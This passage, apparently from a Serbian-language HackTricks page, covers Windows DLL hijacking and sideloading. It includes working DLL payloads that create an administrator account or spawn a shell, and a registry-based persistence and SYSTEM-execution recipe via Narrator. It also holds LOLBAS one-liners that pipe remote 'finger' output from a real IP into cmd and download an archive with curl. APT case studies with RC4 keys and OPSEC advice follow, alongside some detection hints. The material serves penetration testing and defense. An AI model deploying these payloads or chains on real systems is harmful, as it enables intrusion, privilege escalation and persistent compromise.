        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternativna C DLL biblioteka sa ulaznom tačkom niti</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Pristupačnost/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu DLL datoteku za lokalizaciju specifičnu za jezik, koja može biti oteta radi proizvoljnog izvršavanja koda i održavanja pristupa.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Nasleđena putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji upisiva DLL datoteka pod kontrolom napadača, ona se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni nikakvi exports.

Otkrivanje pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC tišina
- Naivan hijack će govoriti/ističe UI. Da biste ostali neprimetni, pri attach-u nabrojte Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte je pomoću `SuspendThread`; nastavite rad u sopstvenoj niti. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Pokretanje i postojanost putem Accessibility konfiguracije
- Kontekst korisnika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kada se primene gornja podešavanja, pokretanje Narrator-a učitava postavljeni DLL. Na bezbednoj radnoj površini (ekranu za prijavu), pritisnite CTRL+WIN+ENTER da biste pokrenuli Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.

Izvršavanje kao SYSTEM pokrenuto preko RDP-a (lateral movement)
- Dozvolite klasični RDP bezbednosni sloj: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se sa hostom putem RDP-a, pa na ekranu za prijavu pritisnite CTRL+WIN+ENTER da biste pokrenuli Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.
- Izvršavanje se zaustavlja kada se RDP sesija zatvori — odmah izvršite inject/migrate.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni unos registra za Accessibility Tool (AT) (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljan binarni fajl/DLL, uvesti ga, a zatim podesiti `configuration` na ime tog AT-a. Na ovaj način se proizvoljno izvršavanje posreduje kroz Accessibility okvir.

Napomene
- Za pisanje u `%windir%\System32` i izmenu HKLM vrednosti potrebna su administratorska prava.
- Celokupan payload može da se nalazi u `DLL_PROCESS_ATTACH`; izvozi nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, koja se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Planirani zadatak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 u kontekstu prijavljenog korisnika.
- **Dozvole direktorijuma**: Omogućavaju upisivanje korisniku `CREATOR OWNER`, pa lokalni korisnici mogu da postave proizvoljne fajlove.
- **Ponašanje pri pretrazi DLL-a**: Prvo pokušava da učita `hostfxr.dll` iz radnog direktorijuma i beleži „NAME NOT FOUND“ ako fajl nedostaje, što ukazuje na prioritet pretrage lokalnog direktorijuma.

### Implementacija exploita

Napadač može da postavi zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristi nedostajući DLL da bi izvršio kod u kontekstu korisnika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Tok napada

1. Kao standardni korisnik, smestite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorskoj sesiji sa srednjim nivoom integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg nivoa integriteta na SYSTEM.

## Studija slučaja: MSI dropper sa CustomAction + DLL side-loading preko potpisanog hosta (wsc_proxy.exe)

Akteri pretnji često kombinuju dropper-e zasnovane na MSI-ju sa DLL side-loading-om kako bi izvršili payload-e u okviru pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se neprimetno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript radnja) i rekonstruiše sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: Avast-potpisani wsc_proxy.exe + wsc.dll pod kontrolom napadača).
- Kada se potpisani EXE pokrene, redosled pretrage DLL-ova u Windows-u prvo učitava wsc.dll iz radnog direktorijuma, čime se izvršava kod napadača u okviru potpisanog nadređenog procesa (ATT&CK T1574.001).

Analiza MSI-ja (na šta obratiti pažnju)
- Tabela CustomAction:
  - Potražite unose koji pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji u pozadini izvršava ugrađenu datoteku.
  - U Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/podeljeni payload-i u MSI CAB-u:
  - Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ili upotrebite lessmsi: lessmsi x package.msi C:\out
  - Potražite više malih fragmenata koji se spajaju i dešifruju pomoću VBScript CustomAction-a. Uobičajen tok:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktični sideloading pomoću wsc_proxy.exe
- Stavite ove dve datoteke u isti direktorijum:
  - wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
  - wsc.dll: DLL napadača. Ako nisu potrebni određeni exporti, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exporte originalnoj biblioteci, dok u DllMain pokrećete payload.
- Napravite minimalni DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Za zahteve za export koristite proxying framework (npr. DLLirant/Spartacus) da biste generisali forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binarnog fajla. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i treba ih uzeti u obzir pri izboru host binarnog fajla i skupa exports.

## Potpisane trijade + šifrovani payloads (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **trijadu od tri fajla** kako bi se uklopio u legitimni softver, a istovremeno zadržao osnovni payload šifrovan na disku:<sup>[[12]](#references)</sup>

1. **Potpisani host EXE** – zloupotrebljavaju se proizvođači kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl tako da izgleda kao Windows binarni fajl (na primer `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Zlonamerni loader DLL** – postavlja se pored EXE fajla pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarni fajl obfuskovan pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe šifrovani blob, dešifruje ga i reflektivno mapira ShadowPad.
3. **Šifrovani payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon mapiranja dešifrovanog payload-a u memoriju, loader briše TMP fajl kako bi uništio forenzičke dokaze.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE fajla (uz zadržavanje originalnog `OriginalFileName` u PE zaglavlju) omogućava mu da se predstavlja kao Windows binarni fajl, a da pritom zadrži potpis proizvođača. Zato oponašajte naviku Ink Dragon-a da postavlja binarne fajlove koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA uslužni programi.
* Pošto izvršni fajl ostaje pouzdan, većina mehanizama allowlistinga zahteva samo da se vaš zlonamerni DLL nalazi pored njega. Usredsredite se na prilagođavanje loader DLL-a; potpisani nadređeni fajl obično može da se pokrene bez izmena.
* ShadowPad-ov decryptor očekuje da se TMP blob nalazi pored loader-a i da može da se menja, kako bi mogao da nulira fajl nakon mapiranja. Ostavite direktorijum upisivim dok se payload ne učita; kada se payload nađe u memoriji, TMP fajl može bezbedno da se izbriše radi OPSEC-a.

### LOLBAS stager + lanac sideloading-a staged archive-a (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS-om tako da je jedini prilagođeni artefakt na disku zlonamerni DLL pored pouzdanog EXE fajla:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera i prosleđuje ih u `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, što operaterima omogućava da rotiraju second stage na serveru.

- **Ugrađeno preuzimanje/raspakivanje:** Preuzmite arhivu sa bezazlenom ekstenzijom, raspakujte je i smestite cilj za sideload i DLL u nasumično izabranu fasciklu `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` skriva prikaz napretka i prati preusmeravanja; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM pokretanje:** Pokrenite EXE preko WMI-ja tako da telemetrija prikazuje proces koji je kreirao CIM dok učitava DLL koji se nalazi u istom direktorijumu:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Radi sa binarnim datotekama koje preferiraju lokalne DLL-ove (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) pokreće se pod pouzdanim imenom.

- **Hunting:** Upozoravajte na `forfiles` kada su `/p`, `/m` i `/c` prisutni zajedno; ova kombinacija je neuobičajena van administratorskih skripti.


## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna upada Lotus Blossom zloupotrebila je pouzdani lanac ažuriranja za isporuku droppera upakovanog pomoću NSIS-a, koji je pripremio DLL sideload i payload-e koji se u potpunosti izvršavaju u memoriji.<sup>[[13]](#references)</sup>

Tok aktivnosti
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, smešta preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, zlonamerni `log.dll` i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE uvozi `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` učitava blob pomoću mmap-a; `LogWrite` ga dešifruje prilagođenim stream cipher-om zasnovanim na LCG-u (konstante **0x19660D** / **0x3C6EF35F**, ključni materijal izveden iz prethodnog heša), prepisuje bafer običnim shellcode-om, oslobađa privremene podatke i skače na njega.
- Da bi izbegao IAT, loader razrešava API-je heširanjem izvoznih naziva pomoću **FNV-1a osnove 0x811C9DC5 + prostog broja 0x1000193**, zatim primenjuje Murmur-stil avalanche transformaciju (**0x85EBCA6B**) i poredi rezultate sa ciljnim heševima sa dodatkom salt-a.

Glavni shellcode (Chrysalis)
- Dešifruje glavni modul nalik PE-u ponavljanjem operacija sabiranja/XOR-a/oduzimanja sa ključem `gQ2JR&9;` tokom pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da bi dovršio razrešavanje importa.
- Rekonstruiše stringove naziva DLL-ova tokom izvršavanja pomoću transformacija rotacije bitova/XOR-a po znakovima, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku izvoznu tabelu u blokovima od 4 bajta uz Murmur-stil mešanja i koristi `GetProcAddress` samo ako heš nije pronađen.

Ugrađena konfiguracija i C2
- Konfiguracija se nalazi u ispuštenoj datoteci `BluetoothService` na **offset-u 0x30808** (veličina **0x980**) i dešifruje se pomoću RC4 ključa `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacon-i prave profil hosta razdvojen tačkama, dodaju prefiks `4Q`, a zatim ga šifruju pomoću RC4 ključa `vAuig34%^325hGV` pre slanja preko HTTPS-a pomoću `HttpSendRequestA`. Odgovori se dešifruju pomoću RC4 i obrađuju na osnovu taga (`4T` shell, `4V` izvršavanje procesa, `4W/4X` upisivanje datoteke, `4Y` čitanje/eksfiltracija, `4\\` deinstalacija, `4` nabrajanje diskova/datoteka + slučajevi prenosa u delovima).
- Režim izvršavanja zavisi od CLI argumenata: bez argumenata = instalira perzistenciju (servis/Run key) koja upućuje na `-i`; `-i` ponovo pokreće sam sebe sa `-k`; `-k` preskače instalaciju i pokreće payload.

Primećena alternativna varijanta loader-a
- Isti upad je isporučio Tiny C Compiler i pokrenuo `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, uz `libtcc.dll` u istom direktorijumu. C izvorni kod koji je dostavio napadač sadržao je shellcode, kompajlirao ga i pokrenuo u memoriji, bez upisivanja PE datoteke na disk. Rekreirajte ovo pomoću:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ova faza kompajliranja i pokretanja zasnovana na TCC-u uvozila je `Wininet.dll` tokom izvršavanja i preuzimala shellcode druge faze sa hardkodiranog URL-a, obezbeđujući fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## Sideloading pomoću potpisanog hosta uz proxy prosleđivanje exporta i zadržavanje host niti

Neki lanci DLL sideloading-a dodaju **stabilizaciju** kako bi legitimni host ostao aktivan dovoljno dugo da se kasnije faze pravilno učitaju, umesto da se sruši nakon učitavanja zlonamernog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postavite pouzdani EXE pored zlonamernog DLL-a koristeći očekivani naziv zavisnosti, kao što je `version.dll`.
- Zlonamerni DLL **prosleđuje svaki očekivani export** stvarnom sistemskom DLL-u (na primer, `%SystemRoot%\\System32\\version.dll`), tako da razrešavanje importa i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, zlonamerni DLL **menja ulaznu tačku hosta**, tako da glavna nit ulazi u beskonačnu petlju `Sleep` umesto da se završi ili izvršava putanje koda koje bi okončale proces.
- Nova nit obavlja stvarni zlonamerni posao: dešifruje naziv ili putanju DLL-a sledeće faze (česti su RC4/XOR), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeno proxy prosleđivanje DLL-a čuva kompatibilnost API-ja, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Zadržavanje glavne niti u `Sleep(INFINITE)` jednostavan je način da potpisani proces ostane pokrenut dok loader obavlja dešifrovanje, pripremu ili mrežno pokretanje u radnoj niti.
- Lov samo na sumnjiv `DllMain` propušta ovaj obrazac ako se zanimljivo ponašanje odvija nakon izmene ulazne tačke hosta i pokretanja sekundarne niti.

Minimalni tok rada
1. Kopirajte potpisani host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji izvozi iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte radnu nit.
4. Iz te niti izmenite ulaznu tačku hosta ili rutinu pokretanja glavne niti tako da se ona vrti u petlji pozivajući `Sleep`.
5. Dešifrujte naziv/konfiguraciju DLL-a sledeće faze i pozovite `LoadLibrary` ili ručno mapirajte payload.

Odbrambeni tragovi
- Potpisani procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog direktorijuma aplikacije umesto iz `System32`.
- Izmene memorije na ulaznoj tački procesa ubrzo nakon učitavanja slike, naročito skokovi/pozivi preusmereni na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL, a koje odmah pozivaju `LoadLibrary` za drugi DLL čiji je naziv dešifrovan.
- Proxy DLL-ovi sa potpunim skupom exporta postavljeni pored izvršnih datoteka dobavljača u direktorijumima za pripremu sa dozvolom za upis, kao što su `ProgramData`, `%TEMP%` ili putanje raspakovanih arhiva.

## References

- [1] [Red Canary – Uvidi iz obaveštajnih podataka: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking u Windows-u. Jednostavan primer u C-u.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore postavlja novi malware koji cilja Evropu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hakovanje pristupačnosti: kada se DLL hijacking susretne sa Windows pomoćnim programima](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitalni dvojnici: anatomija evoluirajućih kampanja lažnog predstavljanja koje distribuiraju Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Podudarni interesi: analiza klastera pretnji usmerenih na vladu jedne zemlje jugoistočne Azije](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relejne mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis backdoor: detaljna analiza Lotus Blossom-ovog skupa alata](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack lanac](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Praćenje špijunskih kampanja iranskog APT-a Screening Serpens iz 2026. godine](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Brzi i žestoki: operacije Nimbus Manticore-a tokom iranskog sukoba](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Radnje zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cilja vlade i kritičnu infrastrukturu jugoistočne Azije](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
